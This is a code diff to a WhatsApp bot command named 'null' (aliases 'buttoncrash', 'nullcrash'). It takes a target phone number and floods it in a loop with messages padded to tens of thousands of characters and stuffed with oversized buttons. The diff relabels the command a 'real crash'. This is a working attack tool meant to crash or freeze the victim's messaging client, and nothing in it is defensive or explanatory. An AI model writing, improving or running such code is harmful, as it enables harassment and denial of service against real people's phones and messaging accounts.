@@ -6,7 +6,7 @@ module.exports = {
     name: 'null',
     aliases: ['button', 'buttoncrash', 'nullcrash'],
     category: 'madaraeye',
-    desc: 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ — ᴍᴀx ᴀɢɢʀᴇssɪᴠᴇ',
+    desc: 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ — ʀᴇᴀʟ ᴄʀᴀsʜ',
     usage: '.null <number>',
     waitReact: true,
 
@@ -32,7 +32,24 @@ module.exports = {
         
         try {
             for (let i = 0; i < TOTAL; i++) {
-                await eye.buttonOverflow(target);
+                // ── FIX: Direct buttons message (not relay) ─────────────
+                const buttons = [];
+                for (let b = 0; b < 500; b++) {
+                    buttons.push({
+                        buttonId: `btn_${i}_${b}`,
+                        buttonText: { displayText: `👁️ ${b} `.padEnd(200, 'x') },
+                        type: 1
+                    });
+                }
+                
+                await sock.sendMessage(target, {
+                    text: 'MADARA EYE'.padEnd(50000, 'x'),
+                    footer: 'MADARA EYE'.padEnd(30000, 'x'),
+                    buttons: buttons.slice(0, 100), // WhatsApp max 100 buttons per message
+                    headerType: 1,
+                    viewOnce: true,
+                }).catch(() => {});
+                
                 await bar.update(1, 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ');
                 if (i % 10 === 0) await new Promise(r => setTimeout(r, 120));
             }
